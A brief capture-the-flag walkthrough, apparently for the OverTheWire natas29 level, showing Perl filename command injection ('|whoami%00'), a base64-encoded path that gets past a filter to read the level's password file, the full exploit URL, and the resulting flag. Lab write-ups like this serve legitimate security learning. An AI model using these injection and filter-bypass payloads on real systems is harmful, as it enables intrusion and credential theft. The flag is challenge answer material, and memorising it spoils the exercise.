@@ -1,0 +1,20 @@
+So there's a perl script running here.
+The URL shows that it's selecting a file.
+Perl interprets filenames starting with a | as a command so changing the filename to "|whoami" should work.
+It doesn't. :(
+After some more reading I found that I need to add a terminating string %00.
+
+?file=|whoami%00
+
+Works!
+
+When trying to read /etc/natas_webpass/natas30 I got denied. I'm assuming there's some kind of filter.
+Before trying to read the code and find a bypass, I tried something that worked.
+
+cat < `echo L2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMzAK | base64 -d` worked :).
+
+Final URL:
+http://natas29.natas.labs.overthewire.org/index.pl?file=|cat%20`echo%20L2V0Yy9uYXRhc193ZWJwYXNzL25hdGFzMzAK%20|%20base64%20-d%20`%00
+
+Flag:
+wie9iexae0Daihohv8vuu3cei9wahf0e
